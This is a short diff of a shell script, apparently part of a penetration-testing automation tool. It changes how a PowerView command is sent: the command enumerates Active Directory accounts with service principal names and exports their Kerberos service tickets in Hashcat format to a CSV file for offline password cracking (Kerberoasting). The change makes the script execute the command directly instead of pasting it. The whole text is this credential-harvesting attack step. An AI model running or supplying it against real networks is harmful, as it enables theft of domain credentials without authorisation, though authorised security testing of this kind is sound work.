@@ -12,5 +12,5 @@ generate_form "${EXPORT_FILE_FIELD}"
 
 EXPORT_FILE=${form_data["export_file"]}
 
-paste_command "Get-DomainUser * -SPN -verbose |  Get-DomainSPNTicket -Format Hashcat | Export-Csv ${EXPORT_FILE} -NoTypeInformation"
-xdotool key Return
+execute_command "Get-DomainUser * -SPN -verbose |  Get-DomainSPNTicket -Format Hashcat | Export-Csv ${EXPORT_FILE} -NoTypeInformation"
+create_new_line
